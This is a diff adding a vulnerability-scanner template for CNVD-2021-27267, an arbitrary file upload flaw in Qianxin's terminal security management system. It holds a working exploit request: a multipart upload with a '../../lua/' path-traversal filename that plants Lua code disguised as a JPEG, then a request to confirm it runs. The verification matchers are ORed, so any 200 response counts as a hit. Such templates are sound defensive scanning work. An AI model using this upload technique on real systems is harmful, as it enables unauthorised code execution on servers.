@@ -1,0 +1,53 @@
+id: cnvd-2021-27267-qianxin-file-upload
+info:
+  name: Qianxin Terminal Security Management System Arbitrary File Upload (CNVD-2021-27267)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CNVD-2021-27267,file-upload
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{rand_base(20)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/api/client_upload_file.json?mid=12345678901234567890123456789012&md5=12345678901234567890123456789012&filename=../../lua/{{t1}}.LUAC"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ"
+    body: |-
+      ------WebKitFormBoundaryLx7ATxHThfk91oxQ
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jpg"
+      Content-Type: image/jpeg
+
+      ngx.print('{{t2}}')
+      ------WebKitFormBoundaryLx7ATxHThfk91oxQ--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "upload_file_md5"
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/api/{{t1}}.json"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "server: QiAnXin web server"
+      - type: word
+        part: header
+        words:
+          - "server: 360 web server"
+      - type: status
+        status:
+          - 200
